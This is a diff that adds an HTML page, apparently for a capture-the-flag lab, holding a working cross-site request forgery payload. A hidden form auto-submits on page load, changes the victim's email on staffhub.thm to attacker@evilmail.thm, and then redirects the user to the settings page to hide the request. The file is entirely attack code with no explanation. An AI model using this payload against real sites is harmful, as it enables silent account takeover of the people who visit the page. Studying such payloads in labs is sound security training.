@@ -1,0 +1,18 @@
+ <html>
+<body>
+
+<form action="http://staffhub.thm:8080/update_email.php" method="POST" id="attack">
+<input type="hidden" name="email" value="attacker@evilmail.thm">
+</form>
+
+<script>
+document.getElementById("attack").submit();
+
+// redirect user after the request is sent
+setTimeout(function() {
+    window.location.href = "http://staffhub.thm:8080/settings.php";
+}, 1000);
+</script>
+
+</body>
+</html>
